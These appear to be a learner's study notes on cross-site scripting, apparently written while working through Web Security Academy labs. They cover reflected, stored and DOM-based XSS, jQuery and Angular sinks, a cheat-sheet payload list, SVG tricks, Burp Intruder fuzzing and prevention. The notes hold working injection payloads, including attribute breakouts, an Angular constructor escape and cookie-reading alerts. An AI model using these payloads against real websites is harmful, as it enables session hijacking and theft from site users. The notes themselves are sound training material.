
### General Notes

> Allows an attacker to control the content of a web application.
> Can target the application users.

> When a web application uses unfiltered user input to build content.
> Attackers can control the output HTML and JavaScript.

> Can steal other user [[Cookies]], or impersonate other user [[Sessions]].

> XSS involves injecting malicious code in the output of the page that is then rendered by users of that page.

---

### Finding XSS

> Look at every user input, and test if it's displayed as output.
> Try injecting HTML tag to see if the HTML is interpreted: `<i>, <h1>`.
> Try injecting JavaScript: `<script>alert('XSS')</script>`

> To exploit the XSS, there are different types of attacks:
1. Reflected.
2. Persistent.
3. DOM Based.
4. Dangling Markup.
---

### Reflected XSS Attacks

> When the payload is carried inside the request that the user (victim) browser sends to the vulnerable website.
* Example: A link to a website with an embedded payload. `http://victim.site/search.php?find=<payload>`.
> Use the simple payload as proof of concept.
```
<script>alert("XSS")</script>
```

> Called reflected because an input field of the [[HTTP]] request sent gets immediately reflected as output in the immediate response of the browser.
> There are reflected XSS filters built now to counter such attack.

---

### Persistent XSS Attacks

> When the malicious payload is sent to the webserver and **stored** there.
> When a webpage then loads, it pulls this payload from the server and the malicious code is displayed within the HTML output.

>Common in HTML forms where users submit content to the webserver and then is displayed back to users.
* Common sections
* User profiles
* Forum posts

---

### DOM-Based XSS

> When javascript takes data from the attacker and passes it to a sink that supports dynamic code execution.
> Such as the URL, which is passed with the `window.location` object.
> Can be found using [[Burp Suite]] web vulnerability scanner.

> The Sink is the portion of code where the payload is entered and executes the attack.
> There is a DOM vulnerability if there is an executable path through which data moves from source to sink.


##### HTML Sinks
> Testing for DOM-based means including alphanumeric strings and checking where it appears in the HTML of the webpage.
> Identify the HTML context, and try constructing a payload that breaks out.
> Adding an extra `"` to break out of the existing tag maybe, or `>` to break out.


#### JavaScript Execution Sinks
> Use the JavaScript debugger to test how the input was sent and interpreted by the sink.
> Identify the JavaScript context, and look at the different variables and areas that the data moves to.
> Try to form a payload that exits or adds another element or tag.

```
"> < svg onload = alert(1) >
```

> Sometimes, we can introduce errors, and then call the onerror attribute with the payload.
```
<img src=1 onerror=alert(1)>
```

##### DOM XSS in jQuery

> The `attr()` functio can change the attributes of DOM elements.
> If data read from a user controlled source and passed to the `attr()` function, we can insert a payload an create a XSS attack.
> Identify jQuery via the `$` sign.

> To execute JavaScript inside attributes, such as `href`, add `javascript: <code>` inside the `href` attribute.

> `location.hash` was used for scrolling animations done using the `hashchange` event handler. ([[Events Module]])
> The `hash` is user controllable, the area that is scrolled to. Payload can be inserted there.
> The payload must trigger `hashchange` without user interaction.
```
<iframe src = "https://website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'"
```

##### DOM XSS in [[Angular]]

> If a webpage uses the `ng-app` attribute, JavaScript inside double curly braces `{{ <code> }}` will be executed anywhere inside the HTML.
> Use the `constructor` function to return references to creating functions. These functions can be executed by adding `()` afterwards. [Function Constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function).
> Used by going to a function in scope, and then calling the constructor with the `alert` function.
```
{{ $new.constructor('alert()') () }}
```
> The `$` is used in JavaScript frameworks and libraries.

> Checking the functions in the scope using the `id` of an element in that scope.
```
anular.element(document.getElementById('<ID>')).scope()
```

##### Reflected DOM XSS

> Sometimes websites reflect in their URL parameters data from the response.
> The server produces data from a request, and echoes it in a response.
> This data could be placed into an item within the DOM, such as in forms.
> A script can then read this data, and places it into a sink that causes the exploit.

##### Stored DOM XSS

> Websites can store data on the server and is then included in a later response.
> A JavaScript script within this repsonse can contain a sink that can cause the exploit.

---

### XSS Payloads

```
mins"> <svg onload=alert(1)>     //closing off a tag and adding a new one.
" onfocus=alert() autofocus x="  //closing off an attribute and adding a new one and closing off the rest.
minso> </select> <svg onload=alert()>
<img src=1 onerror=alert(1)>
href = javascript:alert(document.cookie)
{{ $new.constructor('alert()') () }}
<iframe src ="https://0a0b00b9043b4ccf8331690900400055.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"></iframe>

//if no tags are allowed use the script technique with the location attribute
<script> location = "https://0abc00ce0377f43f8328cd54009500e5.web-security-academy.net/search= <mins id=omar onfocus=alert(document.cookie)> #omar"; </script>
```
> This last one creates a custom tag `mins`, and adds the attribute `onfocus` and then focuses on it using the `#omar` at the end using its id, triggering the event. Can use the `autofocus` attribute as well.

##### `<svg>`

> The `svg` tag allows for other tags inside it, which can be used to craft more complex exploits where some tags are blocked.
```
<svg> <animatetransform onbegin=alert(1)> </svg>

<svg> <a>
<animate attributeName='href' values='javascript:alert(1)'></animate>
<text x='10' y='10'> Click </text>
</a> </svg>
```

##### Finding the Right Tag and Event Attribute Using [[Burp Suite]]

> Head to the [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
1. Open the Burp Suite Intruder tab and inject the placeholders inside `<>` tags to test first the tag itself.
2. Set the payloads to be the copied tags from the cheat sheet.
3. After finding the correct element, find the right attribute by placing the placeholders `<element-found XX=1>`. 
4. Set the payloads to be the copied attributes from the cheat sheet.

---

### [[Cookies]] Stealing With XSS

> JavaScript can only access [[Cookies]] if the `HttpOnly` flag is disabled. 
> Cookies can be displayed with `<script>alert(document.cookie)</script>`.

---

### Preventing XSS Attacks

1. Filter input on arrival
2. Encode data on output
3. Use appropriate response headers
4. Content Security Policy (CSP)

---
